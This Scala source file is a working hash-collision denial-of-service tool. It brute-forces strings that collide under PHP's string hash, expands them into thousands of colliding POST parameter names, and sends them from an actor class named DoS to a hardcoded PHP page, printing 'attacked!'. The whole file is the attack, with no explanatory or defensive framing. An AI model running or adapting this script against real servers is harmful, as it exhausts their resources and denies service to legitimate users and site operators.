import java.io.{ObjectOutputStream, FileOutputStream}
import dispatch._
import scala.actors._

class DoS(target: String, port: Int) extends Actor {
	def act {
		try {
			val req = url(target)
	    	val http = new Http
			http((req << Collision.postParams) as_str)
		} catch {
			case e: java.net.UnknownHostException => println("Couldn't find host. Did you mistype the adress / IP ?")
				
			case e => println("Unkown exception: " + e)
		}
	}
}

object Collision { 
	var postParams = List( ("a", "b") )
	val charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

	def main(args: Array[String]) {
		val numIterations = charset.length * charset.length
		var collisions = List[String]()
		val collisionLen = 9
		val hashFun = phpHash _

		println("Searching for at least three colliding strings")

		while(collisions.length < 3) {
			val stringSeed = util.Random.nextInt(5184)
			val hash = hashFun(StringFromInt(stringSeed))
			collisions = findStringsForHashCode(numIterations, hash, hashFun)
		}

		print("Found them: ")
		println(collisions.map("\"" + _ + "\"").mkString(", "))
		println("For hashcode " + hashFun( collisions.head ) )

		println("Generating %d^%d = %.0f derived collisions".format(collisions.length, collisionLen, math.pow(collisions.length, collisionLen)))

		val manyCols = permutations(collisions, collisionLen)

		postParams = manyCols.toList.map( (_, "a") )

    	(0 to 0).foreach( t => (new DoS("http://furidamu.org/index.php", 80)).start() )

    	println("attacked!")
	}

	def permutations(items: List[String], len: Int): List[String] = {
		if(len == 1) items
		else permutations(items, len - 1).flatMap(s => items.map(_ + s))
	}

	def StringFromInt(n: Int): String = {
		if(n == 0) "" 
		else StringFromInt(n / charset.length) + charset.charAt((n-1) % charset.length)
	}

	def findStringsForHashCode(numIterations: Int, code: Int, hashFun: String => Int) = 
		(0 until numIterations).map(StringFromInt(_)).filter(hashFun(_) == code).toList

	def javaHash(s: String) = s.map(_.toInt).reduceLeft( (hash, next) => hash * 31 + next)

	def phpHash(s: String) = s.map(_.toInt).foldLeft(5381)( (hash, next) => hash * 33 + next)
}